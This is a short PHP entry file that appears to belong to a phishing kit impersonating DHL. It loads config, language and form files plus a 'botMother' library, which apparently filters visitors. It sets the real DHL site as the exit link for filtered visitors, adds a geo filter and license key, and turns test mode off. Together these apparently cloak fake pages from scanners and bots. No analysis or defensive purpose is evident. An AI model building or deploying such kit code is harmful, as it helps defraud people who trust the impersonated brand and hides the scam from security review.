<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/lang/load.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/md.php';
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$m = new botMother();
$bm->setExitLink("https://www.dhl.com/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);
$bm->run();


function setError($msg){
    if(isset($_GET['e'])){
        echo '<div class="error">'.$msg.'</div>';
    }
}



?>